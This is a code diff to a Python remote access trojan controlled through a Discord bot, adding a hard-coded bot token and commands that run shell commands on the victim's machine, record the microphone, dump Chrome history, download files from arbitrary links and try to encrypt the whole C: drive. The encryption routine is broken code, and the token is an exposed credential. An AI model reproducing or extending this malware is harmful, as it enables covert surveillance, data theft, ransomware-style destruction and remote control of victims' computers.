@@ -6,7 +6,7 @@ import subprocess
 import time
 from cv2 import cv2
 
-token = "" #bot token
+token = "NzQ3MjIyNzQ5Mzk4OTU4MzEy.X0Lvag.Ownq-y9wiqujOe9fmkAskdM5nhc" #bot token
 prefix = "rev!"
 bot = discord.Client()
 message = discord.Message
@@ -61,16 +61,14 @@ async def micreg(ctx, args):
     await ctx.send(file=discord.File('recording1.wav'))
     os.remove("recording0.wav")
     os.remove("recording1.wav")
-async def recievetext2(ctx, resulttext):
-    await ctx.send("Client sayd: " + resulttext)
 @bot.command()
-async def receivetext(ctx, *,message:str):
+async def receivetext(ctx):
     import tkinter as tk
     root=tk.Tk()
     root.geometry("400x240")
-    def getTextInput():
+    async def getTextInput(ctx):
         resulttext=textExample.get("1.0","end")
-        recievetext2(resulttext)
+        await ctx.send(resulttext)
     textExample=tk.Text(root, height=10)
     textExample.pack()
     btnRead=tk.Button(root, height=1, width=10, text="Say something to your hacker", 
@@ -89,6 +87,44 @@ async def shellcommand(ctx, *,message:str):
     result = subprocess.run([message], capture_output=True)
     result2 = result.stdout.decode()
     await ctx.send(result2)
+@bot.command()
+async def systeminfo(ctx):
+    await ctx.send("Getting system informations")
+    import platform
+    os = str(platform.release)
+    await ctx.send(os)
+@bot.command()
+async def cryptcdrive(ctx, *,args):
+    from cryptography.fernet import Fernet
+    key = Fernet.generate_key()
+    files = "C:\\"
+    try:
+        for file in files:
+            tocrypt = file.read()
+            encrypted = key.encrypt(tocrypt)
+            encrypted.write(tocrypt)
+            tocrypt.close()
+            await ctx.send("Nuked C:\ Drive!")
+    except Exception as e:
+        await ctx.send("Could not nuke C:\ Drive due to: " + e + " error!")
+@bot.command()
+async def chromehistory(ctx):
+    import browserhistory as bh
+    dict_obj = bh.get_browserhistory()
+    dict_obj.keys()
+    print(dict_obj)
+    if dict_obj == "{}":
+        await ctx.send("ERROR 404: Chrome history not found")
+@bot.command()
+async def downloadfromlink(ctx, args):
+    await ctx.send("Downloading: " + args)
+    import urllib.request
+    try: 
+        url = args
+        urllib.request.urlretrieve(url, "Download")
+        await ctx.send("File downloaded!")
+    except Exception as e:
+        await ctx.send("An error occured: " + e)
 asyncio.set_event_loop(asyncio.new_event_loop())
 loop = asyncio.new_event_loop()
 bot.run(token, bot=True)
